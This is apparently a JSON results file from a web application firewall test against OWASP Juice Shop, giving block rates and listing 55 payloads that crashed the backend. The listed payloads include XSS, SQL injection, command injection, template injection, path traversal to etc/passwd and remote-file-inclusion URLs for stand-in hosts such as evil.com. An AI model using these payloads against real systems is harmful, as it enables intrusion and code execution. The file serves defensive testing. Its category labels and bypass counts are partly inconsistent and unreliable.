@@ -1,0 +1,578 @@
+{
+  "timestamp": "2026-04-21T13:12:49.509665Z",
+  "policy": "all",
+  "overview": {
+    "total_tests": 344,
+    "blocked_by_waf": 289,
+    "bypassed_waf": 0,
+    "backend_crashes": 55,
+    "errors": 0,
+    "overall_block_rate": 84.0
+  },
+  "category_breakdown": {
+    "sqli": {
+      "total": 122,
+      "blocked": 112,
+      "bypassed": 0,
+      "crashed": 10,
+      "block_rate": 91.8
+    },
+    "xss": {
+      "total": 222,
+      "blocked": 177,
+      "bypassed": 0,
+      "crashed": 45,
+      "block_rate": 79.7
+    }
+  },
+  "evasion_techniques_detected": {
+    "url_encoding": 25,
+    "partial_encoding": 12,
+    "case_mixing": 8,
+    "double_encoding": 6,
+    "comment_obfuscation": 3,
+    "nested_tags": 2,
+    "null_byte": 2,
+    "base64": 1,
+    "html_comment_split": 1,
+    "path_traversal": 1
+  },
+  "bypassed_payloads": [
+    {
+      "id": "juiceshop-0014",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "%3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E",
+      "evasion_techniques": [
+        "url_encoding",
+        "nested_tags",
+        "case_mixing",
+        "partial_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0031",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "\"><img src=x o%6ener%72=alert(1)>",
+      "evasion_techniques": [
+        "url_encoding",
+        "partial_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0036",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "evasion_techniques": [
+        "base64",
+        "case_mixing"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0037",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>",
+      "evasion_techniques": [
+        "html_comment_split",
+        "nested_tags"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0049",
+      "category": "sqli",
+      "http_status": 502,
+      "payload": "admin' #",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0053",
+      "category": "sqli",
+      "http_status": 502,
+      "payload": "%2527%2520OR%25201%253D1--",
+      "evasion_techniques": [
+        "double_encoding",
+        "url_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0056",
+      "category": "sqli",
+      "http_status": 502,
+      "payload": "%27--+",
+      "evasion_techniques": [
+        "url_encoding",
+        "comment_obfuscation"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0057",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "%27%23",
+      "evasion_techniques": [
+        "url_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0071",
+      "category": "sqli",
+      "http_status": 502,
+      "payload": "admin%27--+",
+      "evasion_techniques": [
+        "url_encoding",
+        "comment_obfuscation"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0076",
+      "category": "sqli",
+      "http_status": 502,
+      "payload": "%2527%2520OR%25201%253D1--+",
+      "evasion_techniques": [
+        "double_encoding",
+        "url_encoding",
+        "comment_obfuscation"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0090",
+      "category": "sqli",
+      "http_status": 502,
+      "payload": "1=1",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0098",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "JyBPUiAnMT0nJz0nMQ==",
+      "evasion_techniques": [
+        "case_mixing"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0104",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "'#",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0117",
+      "category": "sqli",
+      "http_status": 502,
+      "payload": "%2527%2520OR%25201%253D1%2520--",
+      "evasion_techniques": [
+        "double_encoding",
+        "url_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0118",
+      "category": "xss",
+      "http_status": 502,
+      "payload": ";`id`",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0125",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "%2526%2526whoami",
+      "evasion_techniques": [
+        "double_encoding",
+        "url_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0126",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "$\\{@print(md5(1234))\\}",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0133",
+      "category": "xss",
+      "http_status": 502,
+      "payload": ";id",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0140",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "$\\{@print(md5(1))\\}",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0142",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "%3B%20id",
+      "evasion_techniques": [
+        "url_encoding",
+        "partial_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0143",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "%60uname%20-a%60",
+      "evasion_techniques": [
+        "url_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0153",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
+      "evasion_techniques": [
+        "case_mixing"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0158",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "expect://id",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0163",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "..%c0%af..%c0%afetc%c0%afpasswd",
+      "evasion_techniques": [
+        "url_encoding",
+        "path_traversal",
+        "partial_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0168",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "http://evil.com/shell.txt",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0169",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "%68%74%74%70%3a%2f%2fattacker.com%2fcode.txt",
+      "evasion_techniques": [
+        "url_encoding",
+        "partial_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0170",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "https://evil.com/backdoor.php",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0171",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "%252f%252fmalicious.com%252fshell.txt",
+      "evasion_techniques": [
+        "double_encoding",
+        "url_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0172",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "%5c%5cattacker.com%5cbackdoor.txt",
+      "evasion_techniques": [
+        "url_encoding",
+        "partial_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0173",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "https://attacker.site/malware.php",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0174",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "http://evil.com/shell.txt?",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0177",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "http%3A%2F%2Fevil.com%2Fshell.txt",
+      "evasion_techniques": [
+        "url_encoding",
+        "case_mixing",
+        "partial_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0179",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "http://evil.com%00/shell.php",
+      "evasion_techniques": [
+        "url_encoding",
+        "null_byte"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0180",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "http://evil.com//shell.txt",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0181",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "http://ev%69l.com/shell.php",
+      "evasion_techniques": [
+        "url_encoding",
+        "partial_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0184",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "setTimeout('%61lert(1)',1000)",
+      "evasion_techniques": [
+        "url_encoding",
+        "case_mixing"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0205",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "&#x3C;!--%2Balert('Payload7')%2B--&#x3E;",
+      "evasion_techniques": [
+        "url_encoding",
+        "case_mixing",
+        "partial_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0216",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "<%= 7 * 7 %>",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0217",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "$\\{7*7\\}",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0219",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "%7B%7B7*7%7D%7D",
+      "evasion_techniques": [
+        "url_encoding",
+        "partial_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0220",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "%24%7B7*7%7D",
+      "evasion_techniques": [
+        "url_encoding",
+        "partial_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0221",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "$\\{3*3\\}",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0222",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "$\\{\\{7*7\\}\\}",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0223",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "@(1+2)",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0225",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>$\\{ ex(\"id\")\\}",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0226",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "[#assign ex = 'freemarker.template.utility.Execute'?new()]$\\{ ex('id')\\}",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0227",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "$\\{\"freemarker.template.utility.Execute\"?new()(\"id\")\\}",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0307",
+      "category": "sqli",
+      "http_status": 502,
+      "payload": "%2527%2520OR%25201=1--",
+      "evasion_techniques": [
+        "double_encoding",
+        "url_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0319",
+      "category": "sqli",
+      "http_status": 502,
+      "payload": "'--%00",
+      "evasion_techniques": [
+        "url_encoding",
+        "null_byte"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0324",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "....%5C....%5C....%5Cetc%5Cpasswd",
+      "evasion_techniques": [
+        "url_encoding",
+        "case_mixing",
+        "partial_encoding"
+      ],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0328",
+      "category": "sqli",
+      "http_status": 502,
+      "payload": "1';--",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0339",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "'||",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0342",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "sh$\\{IFS\\}-c$\\{IFS\\}whoami",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0343",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "bash$\\{IFS\\}-c$\\{IFS\\}'id'",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    },
+    {
+      "id": "juiceshop-0344",
+      "category": "xss",
+      "http_status": 502,
+      "payload": "$\\{IFS\\}'id'}",
+      "evasion_techniques": [],
+      "reason": "BACKEND_CRASH"
+    }
+  ],
+  "findings": [
+    "SQLI: 91.8% block rate \u2014 10/122 payloads bypassed WAF",
+    "XSS: 79.7% block rate \u2014 45/222 payloads bypassed WAF",
+    "BACKEND CRASH: 55 payloads caused 502 \u2014 categories: sqli, xss",
+    "TOP EVASION TECHNIQUES: url_encoding (25), partial_encoding (12), case_mixing (8), double_encoding (6), comment_obfuscation (3)"
+  ]
+}
